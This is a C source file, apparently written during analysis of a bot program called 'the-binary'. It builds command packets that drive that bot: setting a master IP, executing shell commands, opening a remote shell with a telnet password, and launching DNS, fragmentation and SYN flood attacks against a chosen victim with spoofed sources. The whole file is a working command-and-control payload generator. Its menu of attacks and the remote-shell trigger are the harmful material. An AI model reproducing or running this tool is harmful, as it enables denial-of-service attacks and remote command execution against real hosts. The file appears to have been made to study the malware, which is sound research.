#include <stdlib.h>
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <string.h>

void show_switch_menu(void);
void set_pattern(char buf[], int buf_len);
void write_payload(char payload[], int payload_len, FILE * fp);
void init_buf(char *buf, int size, char c);

int main(int argc, char *argv[])
{

    char input[50];
    int option;
    char payload[500];
    FILE *fp;
    short cntrl_param;

    if (argc != 2) {

	printf("usage : %s <output_file_name>\n", argv[0]);
	exit(1);
    }
    fp = fopen(argv[1], "w");
    if (fp == NULL) {

	printf("unable to open %s\n", argv[1]);
	exit(1);
    }

    // preset the payload with a certain pattern for ease of tracing 
    // what the-binary does with the data 
    set_pattern(payload, sizeof(payload));
    show_switch_menu();
    printf( "Enter the case no : " );
    if (fgets(input, sizeof(input), stdin) == NULL) {

	puts("error getting input\n");
    }
    printf( "\n" );
    option = atoi(input);

    payload[1] = option + 1;
    switch (option) {

    case 0:
	write_payload(payload, sizeof(payload), fp);
	break;
    case 1:
	// cntrl_parameter can take the following values :
	// 0 => output will be send to only 1 ip ( specified in payload )
	// 2 => output will be send to all 10 ip specified in payload
	// any other value => output will be send to 10 ips, of which
	// 1 is from the payload and the other 9 generated randomly
	printf("Enter cntrl_parameter value: \n");
	if (fgets(input, sizeof(input), stdin) == NULL) {

	    puts("error getting input\n");
	}
	cntrl_param = atoi(input);
	payload[2] = cntrl_param;

	// if cntrl_parameter is 2, we should actually ask for 10 ip instead of
	// only one. But since the rest of the ips seem to serve only as decoy, 
	// it does not really matters.
	printf("Enter IP value: \n");
	if (fgets(input, sizeof(input), stdin) == NULL) {

	    puts("error getting input\n");
	}
	*(int *) (payload + 3) = inet_addr(input);
	write_payload(payload, sizeof(payload), fp);
	break;

    // both execute a command, but case 2 sends the output back, case 6 does not
    case 2:
    case 6:
	printf("Enter command: \n");
	if (fgets(input, sizeof(input), stdin) == NULL) {

	    puts("error getting input\n");
	}
	memcpy(payload + 2, input, strlen(input) + 1);
	write_payload(payload, sizeof(payload), fp);
	break;

    // dns reflective attack
    // for this case and subsequent cases which ask whether to use ip
    // or hostname, the author of the-binary allows the specfication of
    // the destination as a ip or domain name, with a byte in the payload
    // acting as the indicator. There are cleaner ways to handle this
    case 3:
	printf("Enter victim IP value: \n");
	if (fgets(input, sizeof(input), stdin) == NULL) {

	    puts("error getting input\n");
	}
	*(int *) (payload + 2) = inet_addr(input);

	printf("Enter victim port : \n");
	if (fgets(input, sizeof(input), stdin) == NULL) {

	    puts("error getting input\n");
	}
	*(short *) (payload + 6) = htons(atoi(input));

	printf("Enter 0 ( use victim ip ) or 1 ( use hostname ): \n");
	if (fgets(input, sizeof(input), stdin) == NULL) {

	    puts("error getting input\n");
	}
	payload[8] = atoi(input);

	printf("Enter victim hostname : \n");
	if (fgets(input, sizeof(input), stdin) == NULL) {

	    puts("error getting input\n");
	}
	input[strlen(input) - 1] = 0;

	// yes disregard for security
	strcpy(payload + 9, input);

	write_payload(payload, sizeof(payload), fp);
	break;

    // udp or icmp fragmentation attack
    case 4:
	printf("Enter 0( icmp ) or 1( udp ):\n");
	if (fgets(input, sizeof(input), stdin) == NULL) {

	    puts("error getting input\n");
	}
	payload[2] = atoi(input);

	// not used for icmp type, only for udp
	// since this is a frag attack, and fragments other than the first
	// do not contain transport layer header, this field is actually
	// unnecessary
	printf("Enter dst port:\n");
	if (fgets(input, sizeof(input), stdin) == NULL) {

	    puts("error getting input\n");
	}

	// interestingly only 1 byte to hold the port => 0 to 255
	*(payload + 3) = atoi(input);

	printf("Enter victim IP value: \n");
	if (fgets(input, sizeof(input), stdin) == NULL) {

	    puts("error getting input\n");
	}
	*(int *) (payload + 4) = inet_addr(input);

	printf("Enter src IP value: \n");
	if (fgets(input, sizeof(input), stdin) == NULL) {

	    puts("error getting input\n");
	}
	*(int *) (payload + 8) = inet_addr(input);

	printf("Enter 0 ( use victim ip ) or 1 ( use hostname ): \n");
	if (fgets(input, sizeof(input), stdin) == NULL) {

	    puts("error getting input\n");
	}
	payload[12] = atoi(input);

	printf("Enter victim hostname : \n");
	if (fgets(input, sizeof(input), stdin) == NULL) {

	    puts("error getting input\n");
	}
	input[strlen(input) - 1] = 0;
	strcpy(payload + 13, input);

	write_payload(payload, sizeof(payload), fp);
	break;
    case 5:
	write_payload(payload, sizeof(payload), fp);
	printf("telnet to victim port 23281 and type SeNiF\n");
	break;
    case 7:
	write_payload(payload, sizeof(payload), fp);
	break;

    // similar to case 3
    case 8:
	printf("Enter victim IP value: \n");
	if (fgets(input, sizeof(input), stdin) == NULL) {
	    puts("error getting input\n");
	}
	*(int *) (payload + 2) = inet_addr(input);
	printf("Enter NumLoops value: \n");
	if (fgets(input, sizeof(input), stdin) == NULL) {
	    puts("error getting input\n");
	}
	payload[6] = atoi(input);
	printf("Enter victim port value: \n");
	if (fgets(input, sizeof(input), stdin) == NULL) {
	    puts("error getting input\n");
	}
	*(short *) (payload + 7) = htons(atoi(input));
	printf("Enter 0 ( use victim ip ) or 1 ( use hostname ): \n");
	if (fgets(input, sizeof(input), stdin) == NULL) {
	    puts("error getting input\n");
	}
	payload[9] = atoi(input);
	printf("Enter hostname value: \n");
	if (fgets(input, sizeof(input), stdin) == NULL) {
	    puts("error getting input\n");
	}
	input[strlen(input) - 1] = '\0';
	strcpy(payload + 10, input);
	write_payload(payload, sizeof(payload), fp);
	break;

    // tcp syn attack
    case 9:
	printf("Enter victim IP value: \n");
	if (fgets(input, sizeof(input), stdin) == NULL) {
	    puts("error getting input\n");
	}
	*(int *) (payload + 2) = inet_addr(input);
	printf("Enter victim port value: \n");
	if (fgets(input, sizeof(input), stdin) == NULL) {
	    puts("error getting input\n");
	}
	*(short *) (payload + 6) = htons(atoi(input));
	printf("Enter 0 (generate random src ip) or 1 (specify own src ip):\n");
	if (fgets(input, sizeof(input), stdin) == NULL) {
	    puts("error getting input\n");
	}
	payload[8] = atoi(input);
	printf("Enter source IP value: \n");
	if (fgets(input, sizeof(input), stdin) == NULL) {
	    puts("error getting input\n");
	}
	*(int *) (payload + 9) = inet_addr(input);
	printf("Enter 0 ( use victim ip ) or 1 ( use hostname ): \n");
	if (fgets(input, sizeof(input), stdin) == NULL) {
	    puts("error getting input\n");
	}
	payload[13] = atoi(input);
	printf("Enter hostname value: \n");
	if (fgets(input, sizeof(input), stdin) == NULL) {
	    puts("error getting input\n");
	}
	input[strlen(input) - 1] = '\0';
	strcpy(payload + 14, input);
	write_payload(payload, sizeof(payload), fp);
	break;

    // similar to case 9
    case 10:
	printf("Enter victim IP value: \n");
	if (fgets(input, sizeof(input), stdin) == NULL) {
	    puts("error getting input\n");
	}
	*(int *) (payload + 2) = inet_addr(input);
	printf("Enter victim port value: \n");
	if (fgets(input, sizeof(input), stdin) == NULL) {
	    puts("error getting input\n");
	}
	*(short *) (payload + 6) = htons(atoi(input));
	printf("Enter 0 (generate random src ip) or 1 (specify own src ip):\n");
	if (fgets(input, sizeof(input), stdin) == NULL) {
	    puts("error getting input\n");
	}
	payload[8] = atoi(input);
	printf("Enter source IP value: \n");
	if (fgets(input, sizeof(input), stdin) == NULL) {
	    puts("error getting input\n");
	}
	*(int *) (payload + 9) = inet_addr(input);
	printf("Enter NumLoops value: \n");
	if (fgets(input, sizeof(input), stdin) == NULL) {
	    puts("error getting input\n");
	}
	payload[13] = atoi(input);
	printf("Enter 0 ( use victim ip ) or 1 ( use hostname ): \n");
	if (fgets(input, sizeof(input), stdin) == NULL) {
	    puts("error getting input\n");
	}
	payload[14] = atoi(input);
	printf("Enter hostname value: \n");
	if (fgets(input, sizeof(input), stdin) == NULL) {
	    puts("error getting input\n");
	}
	input[strlen(input) - 1] = '\0';
	strcpy(payload + 15, input);
	write_payload(payload, sizeof(payload), fp);
	break;

    // attack on a dns server
    case 11:
	printf("Enter victim IP value: \n");
	if (fgets(input, sizeof(input), stdin) == NULL) {
	    puts("error getting input\n");
	}
	*(int *) (payload + 2) = inet_addr(input);
	printf("Enter source IP value: \n");
	if (fgets(input, sizeof(input), stdin) == NULL) {
	    puts("error getting input\n");
	}
	*(int *) (payload + 6) = inet_addr(input);
	printf("Enter NumLoops value: \n");
	if (fgets(input, sizeof(input), stdin) == NULL) {
	    puts("error getting input\n");
	}
	payload[10] = atoi(input);
	printf("Enter source port value: \n");
	if (fgets(input, sizeof(input), stdin) == NULL) {
	    puts("error getting input\n");
	}
	*(short *) (payload + 11) = htons(atoi(input));
	printf("Enter 0 ( use victim ip ) or 1 ( use hostname ): \n");
	if (fgets(input, sizeof(input), stdin) == NULL) {
	    puts("error getting input\n");
	}
	payload[13] = atoi(input);
	printf("Enter hostname value: \n");
	if (fgets(input, sizeof(input), stdin) == NULL) {
	    puts("error getting input\n");
	}
	input[strlen(input) - 1] = '\0';
	strcpy(payload + 14, input);
	write_payload(payload, sizeof(payload), fp);
	break;
	break;
    }
    fclose(fp);

    return 0;
}

void show_switch_menu(void)
{

    puts("case 0 : get status");
    puts("case 1 : set master ip");
    puts("case 2 : exec cmd with reply");
    puts("case 3 : dns query attack");
    puts("case 4 : fragmentation attack");
    puts("case 5 : spawn remote shell");
    puts("case 6 : exec cmd w/o reply");
    puts("case 7 : kill current attack");
    puts("case 8 : dns query attack with numloops");
    puts("case 9 : syn attack");
    puts("case 10 : syn attack with numloops");
    puts("case 11 : dns attack");

    return;
}

void set_pattern(char buf[], int buf_len)
{

    int i;
    for (i = 0; i < buf_len; i++) {

	buf[i] = i;
    }

    return;
}

void write_payload(char payload[], int payload_len, FILE * fp)
{

    if (fwrite(payload, payload_len, 1, fp) != 1) {

	printf("write failed\n");
    }

    return;
}

void init_buf(char *buf, int size, char c)
{

    int i;
    for (i = 0; i < size; i++) {

	buf[i] = c;
    }

    return;
}
